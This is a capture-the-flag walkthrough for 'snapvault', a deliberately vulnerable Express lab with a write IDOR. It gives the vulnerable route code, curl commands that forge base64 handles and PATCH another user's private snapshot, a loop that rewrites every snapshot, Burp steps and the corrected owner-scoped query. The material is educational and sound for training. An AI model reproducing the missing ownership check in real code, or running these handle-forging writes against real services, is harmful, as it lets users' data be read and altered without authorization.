# snapvault: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-Express-000000?style=flat-square&logo=express&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**snapvault is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read the Express handler and point to the exact missing check.
- Reproduce the exploit by hand, decoding and forging a base64 handle.
- Explain **why** encoding the id did not fix anything — and why a *write* IDOR
  is especially dangerous.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app acts on an object by a client-supplied reference without checking
> the object belongs to the caller. A base64 handle only *encodes* the id — it
> does nothing about *authorization*.

<br>

## 🐛 The vulnerability

Every snapshot is addressed by a base64url **handle** of `snap:<id>`
(`src/handle.ts`):

```ts
export function encodeHandle(id: number): string {
  return Buffer.from(`snap:${id}`, 'utf8').toString('base64url');
}
export function decodeHandle(handle: unknown): number | null {
  // validates SHAPE only — never ownership
  ...
}
```

The update route in `src/routes.ts` decodes the handle and writes to that
snapshot:

```ts
router.patch('/api/snapshots/:handle', requireLogin, async (req, res) => {
  const id = decodeHandle(req.params.handle);          // handle → id
  if (id === null) return res.status(400)...;

  const [snap] = await db.select().from(snapshots).where(eq(snapshots.id, id)).limit(1);
  if (!snap) return res.status(404)...;

  // ⚠️ MISSING OWNERSHIP CHECK — the intentional vulnerability.
  // Nothing compares snap.ownerId to req.session.userId.

  const update = { /* title | body | visibility | sharedWith from the body */ };
  const [updated] = await db.update(snapshots).set(update)
    .where(eq(snapshots.id, id)).returning();
  res.json({ ok: true, snapshot: { handle: encodeHandle(updated.id), ...updated } });
});
```

Walk through it the way the server does:

1. `requireLogin` ensures there **is** a session — authentication. It says
   nothing about *which* snapshots you may edit.
2. `decodeHandle` turns `c25hcDo0` back into `4`. It validates the handle is
   well-formed `snap:<positive int>` — not ownership.
3. The update filters by `snapshots.id = id` and **nothing else**. There is no
   `AND owner_id = <session user>`.
4. The handler writes and returns the row. Any logged-in user can modify any
   snapshot — and the response echoes the updated row back, body included.

The **read** route (`GET /api/snapshots/:handle`) *does* authorize (owner or
`sharedWith == you`, else `403`). That is deliberate: the flaw is on the
**write** path, and the correct read is what lets you observe the result once
you've shared the victim's snapshot to yourself.

And here is the enabler — the **activity feed** (`GET /api/activity`) leaks other
users' handles:

```ts
// returns { handle: encodeHandle(id), title, owner } for others' SHARED snapshots
```

> **Why does it look safe?** The handles are base64, so the team "felt" the ids
> were hidden and skipped the ownership check on write. But base64 is an
> encoding: decode `c25hcDoz` → `snap:3`, and the id space is right there.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`). Bob's **private** snapshot (id 4) holds
the flag. You can't read it directly — but you can write to it.

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

# 2) The leak — the activity feed exposes another user's handle.
curl -s -b jar.txt http://localhost:3000/api/activity
#   → { "activity": [ { "handle": "c25hcDoz", "title": "Team offsite photos",
#                       "owner": "Bob Carrasco" } ] }

# 3) Decode the handle to learn the format, then forge the neighbour.
echo -n 'c25hcDoz' | base64 -d      # → snap:3   (bob's shared snapshot)
echo -n 'snap:4'   | base64         # → c25hcDo0 (bob's PRIVATE snapshot: forged)
```

You now have a handle (`c25hcDo0`) for a snapshot you were never shown. The
write endpoint does not care that it isn't yours:

```bash
# 4) The exploit — write to bob's private snapshot. Share it to yourself.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"sharedWith":"alice"}' \
  http://localhost:3000/api/snapshots/c25hcDo0
```

The response echoes the updated row straight back — flag included:

```json
{
  "ok": true,
  "snapshot": {
    "handle": "c25hcDo0",
    "id": 4,
    "ownerId": 2,
    "title": "Password vault export",
    "body": "Private backup — do not share. FLAG{SNAPVAULT_DECODED_THE_HANDLE}",
    "visibility": "private",
    "sharedWith": "alice"
  }
}
```

You wrote to a snapshot owned by `ownerId: 2` (bob) while authenticated as alice
(`id: 1`). And because you set `sharedWith: alice`, you can now also read it the
"legitimate" way:

```bash
# 5) Optional — the read path now returns it, since it's shared to you.
curl -s -b jar.txt http://localhost:3000/api/snapshots/c25hcDo0
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into bob's private snapshot (`ownerId: 2`, id 4). You have to actually break
> access control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

The update endpoint acts on *any* handle it can decode, so every snapshot in the
workspace is writable: you can deface titles, flip `visibility`, or re-share
other people's captures at will.

```bash
# Walk the id space by forging handles and rewriting each snapshot's title.
for id in $(seq 1 6); do
  h=$(printf 'snap:%s' "$id" | base64)
  curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
    -d '{"title":"owned by alice"}' "http://localhost:3000/api/snapshots/$h"
  echo
done
```

In a real engagement the handle might arrive in a URL, a `Referer`, a shared
link or another API response — but the lesson is identical: once a reference is
*decodable*, a missing ownership check on write lets you tamper with anything.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:3000>. Log in as
   `alice`. The dashboard calls `/api/snapshots` and `/api/activity` — so your
   own handles and bob's leaked handle are in **Proxy > HTTP history**.
2. Send any handle to **Decoder** and base64-decode it → `snap:<id>`. Change the
   number and re-encode (base64url) to forge the target handle `c25hcDo0`.
3. Take a `PATCH /api/snapshots/<your-handle>` request to **Repeater** as a
   baseline (edit one of your own first), then swap in the forged handle and a
   `{"sharedWith":"alice"}` body. The response returns bob's row — with the flag.
4. (Optional) Send the handle parameter to **Intruder** with a numeric payload
   (base64-encode each `snap:<n>` with a payload-processing rule) to rewrite
   every snapshot at once.

> Testing IDOR well means having **two identities**. Proving a snapshot owned by
> bob is writable while authenticated as alice is the proof of a broken
> authorization check — regardless of how "opaque" the handle looks.

<br>

## 🛡️ The fix

Two things are wrong: the write endpoint doesn't authorize, and the feed
over-shares handles. Fix both.

**1. Scope the write to the owner (kills the IDOR).** Make the update itself
refuse other people's rows, so the check can't be forgotten:

```ts
router.patch('/api/snapshots/:handle', requireLogin, async (req, res) => {
  const id = decodeHandle(req.params.handle);
  if (id === null) return res.status(400).json({ error: 'invalid snapshot handle' });

  const update = buildUpdate(req.body);
  const [updated] = await db
    .update(snapshots)
    .set(update)
    .where(and(eq(snapshots.id, id), eq(snapshots.ownerId, req.session.userId!))) // ← owner
    .returning();

  if (!updated) return res.status(404).json({ error: 'snapshot not found' }); // not yours → 404
  res.json({ ok: true, snapshot: { handle: encodeHandle(updated.id), ...updated } });
});
```

**2. Don't treat the handle as a secret.** The base64 wrapper is fine as a tidy
public reference, but it is not a defence — keep the ownership check regardless,
and don't over-expose handles for objects the viewer can't act on.

Why this works: being logged in is necessary but not sufficient; every write
re-checks ownership, the query can't touch someone else's row, and `404` (not
`403`) means an attacker can't even confirm a given id exists.

### ⚠️ Tempting fixes that *don't* work

Part of learning is knowing which "fixes" are traps:

- **"The handle is base64, so users can't tamper with it."** This is the whole
  point of the level. Encoding ≠ encryption ≠ authorization. Decode, change the
  number, re-encode — seconds of work.
- **Switching to hex, a longer token, or a reversible cipher.** Same mistake in
  a new costume — still obscurity, not authorization. (The series explores these
  disguises; the fix is always the ownership check.)
- **Validating the handle shape harder.** `decodeHandle` already rejects
  malformed handles and still the exploit works — a *valid* forged handle is the
  attack.
- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **The id format is irrelevant to authorization.** Sequential, UUID, base64,
   hashid — none of them decide *who may touch the object*.
2. **An encoding is not a secret.** Anything the client can decode, the client
   can forge.
3. **Write IDOR is often worse than read.** You're not just seeing data you
   shouldn't — you're changing it: re-sharing, defacing, escalating.
4. **Authorize every object access on the server, every time, and fail closed.**
5. **Scope at the source.** `WHERE id = :id AND owner_id = :me` makes "forgot the
   check" structurally impossible.

That's Level 4 — a write IDOR behind a base64 handle. Previously,
**[keyvault (Level 3)](https://github.com/iv0ks/keyvault)** was a read IDOR on
random UUIDs. Next in the series,
**[couponly (Level 5)](https://github.com/iv0ks/couponly)** keeps the IDOR but
wraps the id in **hashids** — forge a valid-looking reference. Head back to the
**[Learning Guide](GUIDE.md)** for the method, or the **[README](README.md)**
for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
